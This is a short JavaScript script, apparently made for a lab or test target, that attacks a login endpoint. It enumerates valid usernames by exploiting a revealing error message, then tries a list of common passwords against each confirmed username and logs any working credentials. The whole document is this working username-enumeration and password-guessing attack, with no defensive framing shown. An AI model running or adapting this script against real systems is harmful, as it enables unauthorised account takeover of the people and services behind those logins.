const users = [ "Admin", "admin", "user", "User", "Username", "RufusAdmin"]
const passwords = ["12345", "password123", "Admin", "admin", "password", "drowssap321", "RufusAdmin"]; 

users.forEach(element => {
    axios.post(envUrl + "/auth/login", {
        username: element,
        password: "passwords",
    }).then(request => {   
    }).catch(err => {
        console.log("fail");
        if (err.response.data.message === "The username was correct but password is incorrect") {
            console.log(element);
            
            passwords.forEach(password => {
                axios.post(envUrl + "/auth/login", {
                    username: element, 
                    password: password
                }).then(request => {   
                    if (request.status === 200) {
                        console.log({correctUser: element, correctPassword: password});
                    }
                }).catch(err => {
                    console.log(err);
                    
                });
            });
        }
    });
    
});




